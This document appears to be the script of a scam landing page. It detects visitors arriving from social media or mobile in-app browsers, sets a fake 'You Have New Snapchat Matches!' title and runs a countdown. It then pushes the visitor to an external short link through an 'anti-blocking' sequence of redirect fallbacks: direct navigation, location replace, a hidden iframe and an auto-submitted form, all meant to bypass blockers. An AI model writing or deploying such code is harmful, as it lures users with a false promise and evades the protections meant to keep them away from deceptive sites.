    <script>
        // Enhanced traffic device and social media detection
        function isSocialMediaTraffic() {
            const socialPatterns = [
                /snapchat\.com/i,
                /instagram\.com/i,
                /facebook\.com/i,
                /tiktok\.com/i,
                /twitter\.com/i,
                /fb\.com/i,
                /sc\.com/i
            ];
            
            // Check referrer
            const referrer = document.referrer.toLowerCase();
            const isSocial = socialPatterns.some(pattern => pattern.test(referrer));
            
            // Check user agent for in-app browsers
            const userAgent = navigator.userAgent.toLowerCase();
            const isInApp = userAgent.includes('instagram') || 
                          userAgent.includes('facebook') || 
                          userAgent.includes('snapchat') ||
                          userAgent.includes('tiktok');
            
            return isSocial || isInApp;
        }
        
        // Create fireworks effect
        function createFireworks() {
            const colors = ['#FF2D55', '#FFD166', '#06D6A0', '#118AB2'];
            const container = document.body;
            
            for (let i = 0; i < 20; i++) {
                const firework = document.createElement('div');
                firework.classList.add('firework');
                firework.style.left = Math.random() * 100 + 'vw';
                firework.style.top = Math.random() * 100 + 'vh';
                firework.style.setProperty('--tx', (Math.random() - 0.5) * 200 + 'px');
                firework.style.setProperty('--ty', (Math.random() - 0.5) * 200 + 'px');
                firework.style.animationDelay = Math.random() * 3 + 's';
                firework.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                container.appendChild(firework);
            }
        }
        
        // Anti-blocking redirect sequence
        function smartRedirect() {
            const targetUrl = 'https://smsecured.com/SwnIxhbGsS';
            
            // Try multiple methods to bypass blockers
            const methods = [
                () => { window.location.href = targetUrl; },
                () => { window.location.replace(targetUrl); },
                () => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = targetUrl;
                    document.body.appendChild(iframe);
                    setTimeout(() => { window.location.href = targetUrl; }, 500);
                },
                () => {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = targetUrl;
                    document.body.appendChild(form);
                    form.submit();
                }
            ];
            
            // Execute methods with delays between attempts
            let attempt = 0;
            const tryRedirect = () => {
                if (attempt < methods.length) {
                    try {
                        methods[attempt]();
                    } catch (e) {
                        attempt++;
                        setTimeout(tryRedirect, 300);
                    }
                } else {
                    // Final fallback - show button
                    document.getElementById('countdown').textContent = "Click the button below to continue";
                }
            };
            
            tryRedirect();
        }
        
        // Start countdown
        function startCountdown() {
            let seconds = 5;
            const countdownEl = document.getElementById('countdown-number');
            
            const timer = setInterval(() => {
                seconds--;
                countdownEl.textContent = seconds;
                
                if (seconds <= 0) {
                    clearInterval(timer);
                    smartRedirect();
                }
            }, 1000);
            
            // Immediate click handler
            document.getElementById('ctaButton').addEventListener('click', function(e) {
                e.preventDefault();
                clearInterval(timer);
                smartRedirect();
            });
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            createFireworks();
            
            // Special Snapchat optimizations
            if (navigator.userAgent.toLowerCase().includes('snapchat')) {
                document.title = "üî• You Have New Snapchat Matches!";
                // Add specific Snapchat tracking if needed
            }
            
            // Start the process
            if (isSocialMediaTraffic() || /Android|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
                startCountdown();
            } else {
                // For desktop or direct traffic
                document.getElementById('countdown').textContent = "Preparing your matches...";
                setTimeout(smartRedirect, 2000);
            }
        });
    </script>
